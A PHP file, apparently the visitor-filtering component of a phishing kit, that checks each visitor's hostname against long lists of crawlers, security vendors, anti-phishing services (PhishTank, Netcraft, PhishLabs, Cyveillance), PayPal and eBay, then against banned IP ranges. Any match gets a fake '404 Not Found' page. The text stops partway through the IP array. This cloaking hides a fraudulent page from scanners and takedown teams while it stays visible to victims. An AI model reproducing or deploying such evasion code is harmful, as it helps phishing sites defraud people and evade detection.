<?php

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("datasift","TweetmemeBot","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "Googlebot", "Baiduspider", "ia_archiver","R6_FeedFetcher", "NetcraftSurveyAgent", "Sogou web spider","bingbot", "Yahoo! Slurp", 
"facebookexternalhit", "PrintfulBot","msnbot", "Twitterbot", "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot","PaperLiBot","MJ12bot","AhrefsBot","Exabot","Ezooms",
"YandexBot","SearchmetricsBot","picsearch","TweetedTimes Bot",
"QuerySeekerSpider","ShowyouBot","woriobot","merlinkbot","BazQuxBot","Kraken","SISTRIX Crawler","R6_CommentReader","magpie-crawler",
"GrapeshotCrawler","PercolateCrawler","MaxPointCrawler",
"R6_FeedFetcher","NetSeer crawler","grokkit-crawler","SMXCrawler",
"PulseCrawler","Y!J-BRW","80legs.com/webcrawler","Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "NING","TencentTraveler","Feedfetcher-Google", "mon.itor.us", "spbot", "Feedly","bot","curl","ABCdatos BotLink","Anthill","AraybOt","Aretha", "Big Brother","BlackWidow", "Bloodhound", "ChristCrawler.com", "FastCrawler", "gammaSpider", "FocusedCrawler", "Googlebot", "Kilroy", "LinkScan", "MerzScope","MindCrawler", "Monster", "WebWalker","spider","phishlabs","yanga","yeti","yahoo!","apache-httpclient","lssrocketcrawler","Trident","X11","Macintosh","crawler","urlredirectresolver","jetbrains","spam","windows 95","windows 98","acunetix","netsparker","google","007ac9","008","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot",
"aboundexbot","aboutusbot","abrave spider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite",
"aportworm","arabot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale",
"araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","biglotron","bjaaland","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly",
"calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","ccurl","cusco",
"daumoa","deepindex","delorie","depspid","deweb","die blinde kuh","digger","ditto","dmoz","docomo","download express","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter",
"emacs-w3 search engine","esther","evliya celebi","ezresult","falcon",
"felix ide","ferret","fetchrover","fido","findlinks","fireball","fish search",
"fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl",
"glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit",
"grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hku www octopus","homerweb","htdig","html index","html_analyzer","htmlgobble","hubater","hyper-decontextualizer",
"ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspector web","intelliagent","internet shinchakubin","ip3000",
"iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo",
"kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber",
"lachesis","larbin","legs","libwww","linkalarm","link validator",
"linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet",
"marvin/","mattie","mediafox","mediapartners","mercator","merzscope",
"microsoft url control","minirank","miva","mj12","mnogosearch","moget","monster","moose",
"motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi",
"nameprotect","nationaldirectory","nazilla","ncsa beta","nec-meshexplorer",
"nederland.zoek","netcarta webmap engine","netmechanic","netresearchserver",
"netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","nutch",
"nzexplorer","objectssearch","occam","omni","open text","openfind",
"openintelligencedata","orb search","osis-project","pack rat","pageboy",
"pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgp key agent","phantom","phpdig","picosearch",
"piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","popular iconoclast","psycheclone","publisher","python","rambler","raven search",
"roach","road runner","roadhouse","robbie","robofox","robozilla","rules","salty","spider",
"scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk",
"simmany","site searcher","site valet","sitetech-rover","skymob.com",
"sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere",
"sphider","spinner","spyder","steeler/","suke","suntek","supersnooper",
"surfnomore","sven","sygol","szukacz","tach black widow","tarantula",
"templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan",
"titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd",
"udmsearch","url check","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir",
"walker","wallpaper","wanderer","wauuu","wavefire","web core","web hopper",
"web wombat","webbandit","webcatcher","webcopy","webfoot","weblayers",
"weblinker","weblog monitor","webmirror","webmonkey","webquest","webreaper",
"websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch",
"webwombat","webzinger","wget","whizbang","whowhere","wild ferret",
"worldlight","wwwc","wwwster","xenu","xift","xirq");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
    
    
$blocked_2 =  array("12soso","1noonbot","1on1searchbot","3de_search2","3d_search","3g_bot", "3gse", "aasp", "abachobot", "abonti","abotemailsearch", "aboundex","aboutusbot","accmonitor","compliance","server","accoon","achulkov.net","acme.spider","acoonbot","acquia-crawler","activetouristbot","muncher","adminshop.com","advanced email extractor","aespider","knowledge","now","verity","spider","ahrefs","aibot","aidu","aihitbot","aipbot","aisiid","aitcsrobot","ajsitemap","akamai-sitesnapshot","alexawebsearchplatform","alexfdownload","alexibot","alkalinebot","all acronyms bot","alpha search agent","amerla search bot","amfibibot","ampmppc.com","amznkassocbot","anemone","anonymous","anotherbot","answerbot","answerbus","192.comagent","50.nu","a1 sitemap generator","a1 website download","a6-indexer","aasp","accmonitor compliance server","achulkov.net page walker","adminshop.com","aggregator:vocus","answerchase prove","antbot","antibot","antisantyworm","antro.net","aonde-spider","aport","appengine-google","ppid: s~stremor-crawler","aqua_products","arabot","arachmo","arachnophilia","archive.org_bot","aria equalizer","arianna.libero.it","arikus_spider","art-online.com","artavisbot","artera","asaha search engine turkey","ask","aspider","aspseek","asterias","astrofind","athenusbot","atlocalbot","atomic_email_hunter","attach","attrakt","attributor","augurfind","auresys","autobaron crawler","autoemailspider","autowebdir","avsearch-","axfeedsbot","axonize-bot","ayna","b2w","backdoorbot","backrub","backstreet browser","backweb","baidu","bandit","batchftp","baypup","bdfetch","becomebot","becomejpbot","beetlebot","bender","besserscheitern-crawl","betabot","big data","bigado.com","bigcliquebot","bigfoot","biglotron","bilbo","bilgibetabot","bilgibot","bintellibot","bitlybot","bitvouseragent","bizbot003","bizbot04","bizworks retriever","black hole","black.hole","blackbird","blackmask.net search engine","blackwidow","bladder fusion","blaiz-bee","blexbot","blinkx","blitzbot","blog conversation project","blogmyway","blogpulselive","blogrefsbot","blogscope","blogslive","blowfish","blt","bnf.fr_bot","boaconstrictor","boardreader","boia-scan-agent","boia.org","boitho","boi_crawl_00","bookmark buddy bookmark checker","bookmark search tool","bosug","bot apoena","botalot","botrighthere","botswana","bottybot","bpbot","braintime_search","brokenlinkcheck.com","browseremulator","browsermob","bruinbot","bsearchr&d","bspider","btbot","btsearch","bubing","buddy","buibui","buildcms crawler","builtbottough","bullseye","bumblebee","bunnyslippers","buscadorclarin","buscaplus robi","butterfly","buyhawaiibot","buzzbot","byindia","byspider","byteserver","bzbot","c r a w l 3 r","cacheblaster","caddbot","cafi","camcrawler","camelstampede","canon-webrecord","careerbot","cataguru","catchbot","cazoodle","ccbot","ccgcrawl","ccubee","cd-preload","ce-preload","cegbfeieh","cerberian drtrs","cert figleafbot","cfetch","cfnetwork","chameleon","charlotte","check&get","checkbot","checklinks","cheesebot","chemiede-nodebot","cherrypicker","chilkat","chinaclaw","cipinetbot","cis455crawler","citeseerxbot","cizilla","clariabot","climate ark","climateark spider","clshttp","clushbot","coast scan engine","coastcoccoc webmaster pro","coccoc","collapsarweb","collector","colocrossing","combine","connectsearch","conpilot","contentsmartz","contextad","contype","cookienet","coolbot","coolcheck","copernic","copier","copyrightcheck","core-project","cosmos","covario-ids","cowbot","cowdog bot","crabbybot","craftbot@yahoo.com","crawler.kpricorn.org","crawler43.ejupiter.com","crawler4j","crawler@","crawler_for_infomine","crawly","crawl_application","creativecommon","crescent","cs-crawler","cse html validator","cshttpclient","cuasarbot","culsearch","curl","custo","cvaulev","cyberdog","cybernavi_webget","cyberpatrol sitecat webbot","cyberspyder","cydralspider","d1garabicengine","datacha0s","datafountains","dataparksearch","dataprovider.com","datascape robot","dataspearspiderbot","dataspider","dattatec.com","daumoa","dblbot","declumbot","deepindex","deepnet crawler","deeptrawl","dejan","de.icio.us-thumbnails","deltascan","delvubot","der gro§e bildersauger"
,"der große bildersauger","deusu","dfs-fetch","diagem","diamond","dibot",
"didaxusbot","digext","digger","digi-rssbot","digitalarchivesbot","digout4u",
"diibot","dillo","dir_snatch.exe","disco","distilled-reputation-monitor","djangotraineebot","dkimrepbot","dmoz downloader","docomo","do-verify","domaincrawler","domainscan","domainwatcher bot","dotbot","dotspotsbot","dow jones searchbot","download","doy",
"dragonfly","drip","drone","dtaagent","dtsearchspider","dumbot","dwaar", "dxseeker","e-societyrobot","eah","earth platform indexer",
"earth science educator robot","easydl","ebingbong","ec2linkfinder"
,"ecairn-grabber","ecatch","echoosebot","edisterbot","edugovsearch",
"egothor","eidetica.com","eirgrabber","elblindo the blind bot","elisabot",
"ellerdalebot","email exractor","emailcollector","emailleach","emailsiphon",
"emailwolf","emeraldshield","empas_robot","enabot","endeca","enigmabot",
"enswer neuro bot","enter user-agent","entitycubebot","erocrawler",
"estylesearch","esyndicat bot","eurosoft-bot","evaal","eventware","everest-vulcan inc.","exabot","exactsearch","exactseek","exooba","exploder"
,"express webpictures","extractor","eyenetie","ez-robot","ezooms"
,"f-bot test pilot","factbot","fairad client","falcon","fast data search document retriever","fast esp","fast-search-engine","fastbot crawler"
,"fastbot.de crawler","fatbot","favcollector","faviconizer","favorites sweeper","fdm","fdse robot","fedcontractorbot","fembot","fetch api request"
,"fetch_ici","fgcrawler","filangy","filehound","findanisp.com_is_finder","findlinks","findweb","firebat","firstgov.gov seah","flaming attackbot"
,"flamingo_searchengine","flashcapture","flashget","flickysearchbot","fluffy the spider","flunky","focused_crawler","followsite","foobot" ,"fooooo_web_video_crawl","fopper","formulafinderbot","forschungsportal"
,"francis","freewebmonitoring sitechecker","freshcrawler","freshdownload"
,"freshlinks.exe","friendfeedbot","frodo.at","froggle","frontpage"
,"froola bot","fr_crawler","fu-nbi","full_breadth_crawler","funnelback"
,"furlbot");
foreach($blocked_2 as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}


$blocked_3 = array("g10-bot","gaisbot","galaxybot","gazz","gbplugin" ,"generate_infomine_category_classifiers","genevabot","geniebot","genieo"
,"geomaxenginebot","geometabot","geonabot","geovisu","germcrawler"
,"gethtmlcontents","getleft","getright","getsmart","geturl.rexx"
,"getweb!","giant","gigablastopensource","gigabot","girafabot","gleamebot"
,"gnome-vfs","go!zilla","go-ahead-got-it","go-http-client","goforit.com"
,"goforitbot","gold crawler","goldfire server","golem","goodjelly"
,"gordon-college-google-mini","goroam","goseebot","gotit","govbot"
,"gpu p2p crawler","grabber","grabnet","grafula","grapefx","grapeshot"
,"grbot","greenyogi","gromit","grub","gsa","gslfbot","gulliver","gulperbot"
,"gurujibot","gvcbusiness crawler","gvc crawler","gvc search bot"
,"gvc web crawler","gvc weblink crawler","gvc world links","gvcbot.com"
,"happyfunbot","harvest","hatena antenna","hawler","hca","hclsreport-crawler"
,"hd nutch agent","header_test_client","healia","heritrix","hiscan" ,"hisoftware accmonitor server","hisoftware accverify","hitcrawler","hivabot"
,"hloader","hmsebot","hmview","hoge","holmes","homepagesearch","hooblybot-image","hoowwwer","hostcrawler","hsft - link scanner","hsft - lvu scanner"
,"hslide","ht://check","htdig","html link validator","htmlparser","httplib"
,"httrack","huaweisymantecspider","hul-wax","humanlinks","hyperestraier"
,"hyperix","iaarchiver-","ia_archiver","ibuena","icab","icds-ingestion"
,"ichiro","icopyright conductor","ieautodiscovery","iecheck","ihwebchecker"
,"iiitbot","iim_405","ilsebot","iltrovatore","image stripper","image sucker"
,"image-fetcher","imagebot","imagefortress", "imageshereimagesthereimageseverywhere","imagevisu","imds_monitor","imo-google-robot-intelink","inagist.com url crawl","indexer","industry cortex webcrawler","indy library","indylabs_marius","inelabot","inet32 ctrl"
,"inetbot","info seeker","infolink","infomine","infonavirobot","informant"
,"infoseek sidewinder","infotekies","infousabot","ingrid","inktomi" ,"insightscollector","insightsworksbot","inspirebot","insumascout"
,"intelix","intelliseek","interget","internet ninja","internet radio crawler"
,"internetlinkagent","interseek","ioi","ip-web-crawler.com","ipadd bot"
,"ipselonbot","ips-agent","iria","irlbot","iron33","isara","isearch","isilox"
,"istellabot","its-learning crawler","iu_csci_b659_class_crawler","ivia"
,"jadynave","java","jbot","jemmathetourist","jennybot","jetbot","jetbrains omea pro","jetcar","jim","jobo","jobspider_ba","joc","joedog","joyscapebot"
,"jspyda","junut bot","justview","jyxobot","k.s.bot","kakclebot","kalooga"
,"katatudo-spider","kbeta1","keepni web site monitor","kenjin.spider"
,"keybot translation-search-machine","keywenbot","keyword density"
,"keyword.density","kinjabot","kitenga-crawler-bot","kiwistatus","kmbot-"
,"kmccrew botsearch","knight","knowitall","knowledge engine","knowledge.com"
,"koepabot","koninklijke","korniki","krowler","ksbot","kuloko-bot","kulturarw3","kummhttp","kurzor","kyluka crawl","l.webis","labhoo"
,"labourunions411","lachesis","lament","lamerexterminator","lapozzbot"
,"larbin","lbot","leaptag","leechftp","leechget","letscrawl.com","lexibot"
,"lexxebot","lftp","libcrawl","libiviacore","libw","likse","linguee bot"
,"link checker","link validator","linkalarm","linkbot","linkcheck by siteimprove.com","linkcheck scanner","linkchecker","linkdex.com"
,"linkextractorpro","linklint","linklooker","linkman","links sql","linkscan"
,"linksmanager.com_bot","linksweeper","linkwalker","link_checker" ,"litefinder","litlrbot","little grabber at skanktale.com","livelapbot"
,"lm harvester","lmqueuebot","lnspiderguy","loadtimebot","localcombot"
,"locust","lolongbot","lookbot","lsearch","lssbot","lt scotland checklink"
,"ltx71.com","lwp","lycos_spider","lydia entity spider","lynnbot"
,"lytranslate","mag-net","magnet","magpie-crawler","magus bot","mail.ru"
,"mainseek_bot","mammoth","map robot","markwatch","masagool","masidani_bot_"
,"mass downloader","mata hari","mata.hari","matentzn at cs dot man dot ac dot uk","maxamine.com--robot","maxamine.com-robot","maxomobot","mcbot" ,"medrabbit","megite","memacbot","memo","mendeleybot","mercator-" ,"mercuryboard_user_agent_sql_injection.nasl","metacarta","metaeuro web search","metager2","metagloss","metal crawler","metaquerier","metaspider"
,"metaspinner","metauri","mfcrawler","mfhttpscan","midown tool","miixpc"
,"mini-robot","minibot","minirank","mirror","missigua locator","mister pix"
,"mister.pix","miva","mj12bot","mnogosearch","moduna.com","mod_accessibility"
,"moget","mojeekbot","monkeycrawl","moses","mowserbot","mqbot","mse360"
,"msindianwebcrawl","msmobot","msnpt","msrbot","mt-soft","multitext"
,"my-heritrix-crawler","myapp","mycompanybot","mycrawler","myengines-us-bot"
,"myfamilybot","myra","my_little_searchengine_project","nabot","najdi.si"
,"nambu","nameprotect","nasa search","natchcvs","natweb-bad-link-mailer"
,"naver","navroad","nearsite","nec-meshexplorer","neosciocrawler"
,"nerdbynature.bot","nerdybot","nerima-crawl-","nessus","nestreader"
,"net vampire","net::trackback","netants","netcarta cyberpilot pro"
,"netcraft","netexperts","netid.com bot","netmechanic","netprospector"
,"netresearchserver","netseer","netshift","netsongbot","netsparker"
,"netspider","netsrcherp","netzip","newmedhunt","news bot","newsgatherer"
,"newsgroupreporter","newstrovebot","news_search_app","nextgensearchbot"
,"nextthing.org","nicebot","nicerspro","niki-bot","nimblecrawler","nimbus-1"
,"ninetowns","ninja","njuicebot","nlese","noga","norbert the spider"
,"noteworthybot","npbot","nrcan intranet crawler","nsdl_search_bot"
,"nuggetize.com bot","nusearch spider","nutch","nu_tch","nwspider"
,"nymesis","nys-crawler","objectssearch","obot","obvius external linkcheck"
,"ocelli","octopus","odp entries t_st","oegp","offline navigator"
,"offline.explorer","ogspider","omiexplorer_bot","omniexplorer","omnifind"
,"omniweb","onetszukaj","online link validator","oozbot","openbot","openfind"
,"openintelligencedata","openisearch","openlink virtuoso rdf crawler"
,"opensearchserver_bot","opidig","optidiscover","oracle secure enterprise search","oracle ultra search","orangebot","orisbot","ornl_crawler", "ornl_mercury","osis-project.jp","oso","outfoxbot","outfoxmelonbot"
,"owler-bot","owsbot","ozelot","p3p client","pagebiteshyperbot"
,"pagebull","pagedown","pagefetcher","pagegrabber","pagepeeker"
,"pagerank monitor","page_verifier","pamsnbot.htm","panopy bot"
,"panscient.com","pansophica","papa foto","paperlibot","parasite","parsijoo"
,"pathtraq","pattern","patwebbot","pavuk","paxleframework","pbbot"
,"pcbrowser","pcore-http","pd-crawler","penthesila","perform_crawl"
,"perman","personal ultimate crawler","php version tracker","phpcrawl"
,"phpdig","picosearch","pieno robot","pipbot","pipeliner","pita","pixfinder"
,"piyushbot","planetwork bot search","plucker","plukkie","plumtree"
,"pockey","pocohttp","pogodak.ba","pogodak.co.yu","poirot","polybot","pompos"
,"poodle predictor","popscreenbot","postpost","privacyfinder","projectwf-java-test-crawler","propowerbot","prowebwalker","proxem websearch","proximic"
,"proxy crawler","psbot","pss-bot","psycheclone","pub-crawler","pucl"
,"pulsebot","pump","pwebot","python","qeavis agent","qfkbot","qualidade"
,"qualidator.com bot","quepasacreep","queryn metasearch","queryn.metasearch"
,"quest.durato","quintura-crw","qunarbot","qwantify","qweerybot"
,"qweery_robot.txtheckbot","r2ibot","r6_commentreader","r6_feedfetcher"
,"r6_votereader","rabot","radian6","radiation retriever","rampybot"
,"rankivabot","rankur","rational sitecheck","rcstartbot","realdownload"
,"reaper","rebi-shoveler","recorder","redbot","redcarpet","reget","repomonkey"
,"research robot","riddler","riight","risenetbot","riverglassscanner");
foreach($blocked_3 as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}


$blocked_4 = array("robopal","robosourcer","robotek","robozilla","roger", "rome client","rondello","rotondo","roverbot","rpt-httpclient","rtgibot"
,"rufusbot","runnk online rss reader","runnk rss aggregator","s2bot"
,"safaribookmarkchecker","safednsbot","safetynet robot","saladspoon"
,"sapienti","sapphireweb","sbider","sbl-bot","scfcrawler","scich"
,"scientificcommons.org","scollspider","scooperbot","scooter","scoutjet"
,"scrapebox","scrapy","scrawltest","screaming frog","scrubby","scspider"
,"scumbot","search publisher","search x-bot","search-channel","search-engine-studio","search.kumkie.com","search.updated.com","search.usgs.gov"
,"searcharoo.net","searchblox","searchbot","searchengine","searchhippo.com"
,"searchit-bot","searchmarking","searchmarks","searchmee","searchmee_v"
,"searchmining","searchnowbot","searchpreview","searchspider.com"
,"searqubot","seb spider","seekbot","seeker.lookseek.com","seeqbot"
,"seeqpod-vertical-crawler","selflinkchecker","semager","semanticdiscovery"
,"semantifire","semisearch","semrushbot","seoengworldbot","seokicks"
,"seznambot","shablastbot","shadowwebanalyzer","shareaza","shelob","sherlock"
,"shim-crawler","shopsalad","shopwiki","showlinks","showyoubot","siclab"
,"silk","simplepie","siphon","sitebot","sitecheck","sitefinder","siteguardbot","siteorbiter","sitesnagger","sitesucker","sitesweep","sitexpert","skimbot"
,"skimwordsbot","skreemrbot","skywalker","sleipnir","slow-crawler","slysearch","smart-crawler","smartdownload", "smarte bot","smartwit.com","snake","snap.com beta crawler","snapbot"
,"snappreviewbot","snappy","snookit","snooper","snoopy","societyrobot","socscibot","soft411 directory","sogou","sohu agent","sohu-search","sokitomi crawl"
,"solbot","sondeur","sootle","sosospider","space bison","space fung" ,"spacebison","spankbot","spanner","spatineo monitor controller"
,"spatineo serval controller","spatineo serval getmapbot","special_archiver"
,"speedy","sphere scout","sphider","spider.terranautic.net","spiderengine"
,"spiderku","spiderman","spinn3r","spinne","sportcrew-b","sproose"
,"spyder3.microsys.com","sq webscanner","sqlmap","squid-prefetch"
,"squidclamav_redirector","sqworm","srevbot","sslbot","ssm agent"
,"stackrambler","stardownloader","statbot","statcrawler"
,"statedept-crawler","steeler","stegmann-bot","stero","stripper","stumbler"
,"suchclip","sucker","sumeetbot","sumitbot","summizebot","summizefeedreader"
,"sunrise xp","superbot","superhttp","superlumin downloader","superpagesbot"
,"supremesearch.net","supybot","surdotlybot","surf","surveybot","suzuran"
,"swebot","swish-e","sygolbot","synapticwalker","syntryx ant scout chassis pheromone","systemsearch-robot","szukacz","s~stremor-crawler"
,"t-h-u-n-d-e-r-s-t-o-n-e","tailrank","takeout","talkro web-shot"
,"tamu_crawler","tapuzbot","tarantula","targetblaster.com"
,"targetyournews.com bot","tausdatabot","taxinomiabot","teamsoft wininet component","tecomi bot","teezirbot","teleport","telesoft","teradex mapper"
,"teragram_crawler","terrawizbot","testbot","testing of bot","textbot"
,"thatrobotsite.com","the dyslexalizer","the intraformant"
,"the.intraformant","thenomad","theophrastus","theusefulbot","thumbbot"
,"thumbnail.cz rot","thumbshots-de-bot","tigerbot","tighttwatbot","tineye"
,"titan","to-dress_ru_bot_","to-night-bot","tocrawl","topicalizer", "topicblogs","toplistbot"
,"topserver php","topyx-crawler","touche","tourlentascanner","tpsystem"
,"traazi","transgenikbot","travel-search","travelbot","travellazerbot"
,"treezy","trendiction","trex","tridentspider","trovator","true_robot"
,"tscholarsbot","tsm translation-search-machine","tswebbot"
,"tulipchain","turingos","turnitinbot","tutorgigbot","tweetedtimes bot"
,"tweetmemebot","twengabot","twice","twikle","twinuffbot","twisted pagegetter","twitturls","twitturly","tygobot","tygoprowler","typhoeus"
,"u.s. government printing office","uberbot","ucb-nutch","udmsearch"
,"ufam-crawler-","ultraseek","unchaos","unisterbot","unidentified"
,"unitek uniengine","universalsearch","unwindfetchor","uoftdb_experiment"
,"updated","url control","url-checker","urlappendbot","urlblaze","urlchecker","urlck","urldispatcher"
,"urlspiderpro","urly warning","urly.warning","url_gather","usaf afkn k2spider","usasearch"
,"uss-cosmix","usyd-nlp-spider","vacobot","vacuum","vadixbot","vagabondo","validator","valkyrie"
,"vbseo","vci webviewer vci webviewer win32","verbstarbot","vericitecrawler","verifactrola"
,"verity-url-gateway","vermut","versus crawler","versus.integis.ch","viasarchivinginformation.html"
,"vipr","virus-detector","virus_detector","visbot","vishal for clia","visweb","vital search'n urchin"
,"vlad","vlsearch","voilabot","vmbot","vocusbot","voideye","voil","vortex","voyager","vspider"
,"w3c-webcon","w3c_unicorn","w3search","wacbot","wanadoo","wastrix","water conserveportal"
,"water conserve spider","watzbot","wauuu","wavefire","waypath","wazzup","wbdbot"
,"web ceo online robot","web crawler","web downloader","web image collector","web link validator"
,"web magnet","web site downloader","web sucker","web-agent","web-sniffer","web.image.collector"
,"webaltbot","webauto","webbot","webbul-bot","webcapture","webcheck","webclipping.com"
,"webcollage","webcopier","webcopy","webcorp","webcrawl.net","webcrawler","webdatacentrebot"
,"webdownloader for x","webdup","webemailextrac","webenhancer","webfetch","webgather"
,"webgobbler","webimages","webinator-search2","webinator-wbi","webindex","weblayers"
,"webleacher","weblexbot","weblinker","weblyzard","webmastercoffee","webmasterworld extractor"
,"webmasterworldforumbot","webminer","webmoose","webot","webpix","webreaper","webripper"
,"websauger","webscan","websearchbench","website","webspear","websphinx","webspider"
,"webster","webstripper","webtrafficexpress","webtrends link analyzer","webvac","webwalk"
,"webwasher","webwatch","webwhacker","webxm","webzip","weddings.info","wenbin","wep search"
,"wepa","werelatebot","wget","whacker","whirlpool web engine","whowhere robot","widow"
,"wikiabot","wikio","wikiwix-bot-","winhttp","wire","wisebot","wisenutbot","wish-la"
,"wish-project","wisponbot","wmcai-robot","wminer","wmsbot","woriobot","worldshop"
,"worqmada","wotbox","wume_crawler","www collector","www-collector-e","www-mechanize"
,"wwwoffle","wwwrobot","wwwster","wwwwanderer","wwwxref","wysigot","x-clawler"
,"x-crawler","xaldon","xenu","xerka metabot","xerka webbot","xget","xirq","xmarksfetch"
,"xqrobot","y!j","yacy.net","yacybot","yanga worldsearch bot","yarienavoir.net"
,"yasaklibot","yats crawler","ybot","yebolbot","yellowjacket","yeti","yolinkbot","yooglifetchagent"
,"yoono","yottacars_bot","yourls","z-add link checker","zagrebin","zao","zedzo.validate","zermelo"
,"zeus","zibber-v","zimeno","zing-bottabot","zipppbot","zongbot","zoomspider","zotag search"
,"zsebot","zuibot","zyborg","zyte");
foreach($blocked_4 as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}



$bannedIP = array("^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
 "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*",
"^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
 "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
 "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
 "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
 "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
 "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
 "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
 "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
 "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
 "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*",
"^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*",
"^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*",
"^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
 "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*","^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*","^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*","^66.211.169.3","^66.211.169.66","^89.163.159.214", "^37.128.131.171","^12.148.196.*","^193.220.178.*","^68.65.53.71", "^198.25.*.*", "^64.106.213.*","^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*","^65.55.206.154","^193.221.113.53","^208.76.45.53","^208.84.*.*","^207.46.8.167","^65.54.188.110", "^207.46.8.199","^134.170.2.199","^65.55.92.152","^65.54.188.94","^65.55.37.104","^65.55.92.168","^65.55.37.120", "^65.55.33.119",
